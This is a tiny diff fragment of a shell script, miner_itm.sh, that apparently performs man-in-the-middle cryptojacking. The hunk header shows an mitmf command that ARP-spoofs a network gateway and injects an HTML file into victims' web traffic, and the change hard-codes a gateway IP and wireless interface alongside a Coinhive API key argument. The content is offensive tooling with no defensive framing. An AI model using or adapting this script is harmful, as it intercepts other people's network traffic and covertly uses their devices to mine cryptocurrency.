@@ -6,5 +6,5 @@ mitmf –inject –html-file /root/.miner_itm.html –spoof –arp –gateway $2
 
 else
 
-echo “./miner_itm.sh <coinhive api key> <gateway ip> <interface name>”
+echo “./miner_itm.sh <coinhive api key> 192.168.42.1 wlan0”
 fi
